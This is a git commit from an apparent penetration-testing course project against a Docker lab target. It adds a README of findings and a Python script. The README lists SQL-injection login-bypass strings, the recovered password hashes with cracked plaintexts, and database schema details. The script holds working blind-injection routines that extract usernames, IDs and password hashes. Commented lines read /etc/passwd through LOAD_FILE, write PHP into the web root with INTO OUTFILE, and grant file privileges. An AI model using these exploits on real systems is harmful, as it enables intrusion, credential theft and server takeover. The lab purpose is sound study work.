7e9c4fbf68583104318a243829e55edf81af1cfb
LBartolini <l.bartolini02@gmail.com>
2024-05-14 17:22:14 +0200

    Fine parte operativa

--- README.md
+++ README.md
@@ -5,7 +5,7 @@ Progetto Penetration Testing
 
 *docker run gabrielec/ptexam*
 
-Payloads [(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#tools)]
+Payloads [(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)]
 
 Information Gathering
 
@@ -14,7 +14,7 @@ Information Gathering
 
 - Apache server 2.4.38 (url random da pagina di errore Apache)
 
-- PHP 7.2.34 (Response Header)
+- PHP 7.2.34 (Response Header e debug.php)
 
 - MariaDB (carattere ' in username nella pagina login)
 
@@ -34,25 +34,87 @@ Information Gathering
 
   - sostituisce gli spazi con dei +
 
-  - hash MD5 di password (plain) (Username: frog'; password: frog)
+  - hash MD5 di password (Username: frog'; password: frog)
 
-- Pagina logout.php
+- Pagine (non banali) presenti: (metasploit: auxiliary/scanner/http/files_dir)
 
-- Utente: agentX
+  - config.php
+  
+  - Vuota
+  
+  - debug.php
+  
+    - Server Administrator: webmaster@localhost
+
+    - Server Root: /etc/apache2
+
+    - DOCUMENT_ROOT: /var/www/html
+
+    - SMTP
+
+  - logout.php
+
+- Utenti: (enum_users())
+
+  - {'sysadmin', 'utente', 'agentx', 'tizio.incognito', 'jackofspade'}
+
+- Il contenuto di un report non viene visualizzato nella pagina /report.php
 
 Vulnerabilities
 
 - SQL Injection (/login.php)
+  
+  - Bypass Login:
 
-  - ' OR Username LIKE (SELECT Username) LIMIT 1; #
+    - ' OR Username LIKE (SELECT Username) LIMIT 1; #
 
-  - ' OR Username LIKE 'agentX' LIMIT 1; #
+    - ' OR Username LIKE 'agentX' LIMIT 1; #
 
-- Password (hashed MD5) per agentX: b20e0aaa66fdd9a7a5b2ebf49d32b91b (get_password())
+  - Password (hashed MD5):  (get_password())
+
+    - agentx: b20e0aaa66fdd9a7a5b2ebf49d32b91b 
+
+    - sysadmin: fcea920f7412b5da7be0cf42b8c93759 (Plain: 1234567)
+
+    - utente: bed128365216c019988915ed3add75fb (Plain: passw0rd)
+
+    - tizio.incognito: 5ebe2294ecd0e0f08eab7690d2a6ee69 (Plain: secret)
+
+    - jackofspade: 617882784af86bff022c4b57a62c807b
+
+  - Id:  (get_id())
+
+    - agentx: 10 
+
+    - sysadmin: 1337
+
+    - utente: 42
+
+    - tizio.incognito: 7
+
+    - jackofspade: 8
+
+(Informazioni sugli utenti confermate dall'injection sui reports)
+
+- SQL Injection (/send.php) 
+  
+  - Tabella con i report con 2 campi (Campo title: test2', 'abc2'); # )
+
+  - User MySQL connesso a PHP: admin@localhost (Campo title: 123', (SELECT user())); # )
+
+  - System User: admin@localhost
+
+  - Nome Database: niadb
+
+  - Versione MariaDB: 10.3.39-MariaDB-0+deb10u2 ()
+
+  - Tabelle DB: (inject_sql('(SELECT table_name FROM information_schema.tables WHERE table_schema LIKE 'niadb' LIMIT 0, 1)))
+
+    - reports(repid: smallint, agent: varchar, title: varchar, message: varchar) (inject_sql("(SELECT CONCAT(column_name, data_type) FROM information_schema.columns WHERE table_schema LIKE 'niadb' AND table_name LIKE 'reports' LIMIT 0, 1)"))
+
+    - agents(id:smallint, username: varchar, password: varchar) (inject_sql("(SELECT CONCAT(column_name, data_type) FROM information_schema.columns WHERE table_schema LIKE 'niadb' AND table_name LIKE 'agents' LIMIT 0, 1)"))
 
 - Reflected XSS (/welcome.php)
-
-- Maybe SSRF (SSRFmap [https://github.com/swisskyrepo/SSRFmap/tree/master])
 
 - Reflected XSS (/recovery.php)
 
---
+++ scripts.py
@@ -0,0 +1,113 @@
+import string
+import requests
+import random
+from threading import Thread
+
+phpsession = '13e4323d8265e2ec24c179464d20283d'
+
+def get_password(username, url='172.17.0.2'):
+    # Password MD5 Hash
+    chars_lower = 'abcdef'
+    alfabeto = string.digits + chars_lower + chars_lower.upper()
+    
+    password = ''
+    for _ in range(32):
+        for char in alfabeto:
+            tmp = password+char+'%'
+            response = requests.post(f'http://{url}/login.php', data={
+                'username': f"{username}' AND Password LIKE '{tmp}' LIMIT 1; #", 
+                'password': '...'})
+            
+            if response.url == f"http://{url}/welcome.php":
+                password += char
+                #print(f"found {char} (Now {password})")
+                break
+    
+    return password
+
+def get_id(username, url='172.17.0.2'):
+    alfabeto = string.digits
+    
+    id = ''
+    for _ in range(32):
+        for char in alfabeto:
+            tmp = id+char+'%'
+            response = requests.post(f'http://{url}/login.php', data={
+                'username': f"{username}' AND Id LIKE '{tmp}' LIMIT 1; #", 
+                'password': '...'})
+            
+            if response.url == f"http://{url}/welcome.php":
+                id += char
+                #print(f"found {char} (Now {id})")
+                break
+    
+    return id
+
+def enum_users(url='172.17.0.2'):
+    alfabeto = string.digits + string.ascii_lowercase + string.punctuation
+    alfabeto = [a for a in alfabeto]
+
+    found = []
+    for i in range(30):
+        print("Cerco user: #", i)
+        random.shuffle(alfabeto)
+        username = ''
+        for _ in range(64):
+            foundChar = False
+            for char in alfabeto:
+                if char == '%' or char == '_':
+                    continue
+
+                tmp = username+char+'%'
+                response = requests.post(f'http://{url}/login.php', data={'username': f"' OR Username LIKE '{tmp}' LIMIT 1; #", 
+                                            'password': '...'})
+                
+                if response.url == f'http://{url}/welcome.php':
+                    foundChar = True
+                    username += char
+                    #print(f"found {char} (Now {username})")
+                    break
+            
+            if not foundChar:
+                break
+
+        found.append(username)
+        print(username)
+    return set(found)
+
+def inject_sql(command, url='172.17.0.2'):
+    requests.post(f'http://{url}/send.php', data={
+                'agent': '',
+                'title': f"inject_sql', {command} ); #", 
+                'message': '...'},
+                cookies={
+                    'PHPSESSID': phpsession
+                })
+    
+def exec_sql(command, url='172.17.0.2'):
+    requests.post(f'http://{url}/send.php', data={
+                'agent': '',
+                'title': f"inject_sql', 'message'); {command} #", 
+                'message': '...'},
+                cookies={
+                    'PHPSESSID': phpsession
+                })
+
+
+if __name__ == '__main__':
+    #print(get_password('jackofspade', '127.0.0.1'))
+    #print(get_id('tizio.incognito', '127.0.0.1'))
+    #print(enum_users('127.0.0.1'))
+
+    #inject_sql("(SELECT table_name FROM information_schema.tables WHERE table_schema LIKE 'niadb' LIMIT 0, 1)", '127.0.0.1')
+    #inject_sql("(SELECT CONCAT(column_name, data_type) FROM information_schema.columns WHERE table_schema LIKE 'niadb' AND table_name LIKE 'agents' LIMIT 3, 1)", '127.0.0.1')
+    
+    #for i in range(10):
+    #    inject_sql(f"(SELECT CONCAT(id, ' ', username, ' ', password) FROM agents LIMIT {i}, 1)", '127.0.0.1')
+
+    #inject_sql("(SELECT LOAD_FILE('/etc/passwd')) LIMIT 1", '127.0.0.1')
+
+    #inject_sql("(SELECT IF(COUNT(*) > 0, 'TRUE', 'FALSE') AS Allowed FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE GRANTEE LIKE '%admin%localhost%' AND PRIVILEGE_TYPE = 'CREATE USER')", '127.0.0.1')
+    #exec_sql("SELECT '' INTO OUTFILE '/var/www/html/config.php' FIELDS TERMINATED BY '<?php phpinfo();?>'", '127.0.0.1')
+    #exec_sql("GRANT FILE ON *.* TO 'admin'@'localhost';", '127.0.0.1')
+    pass
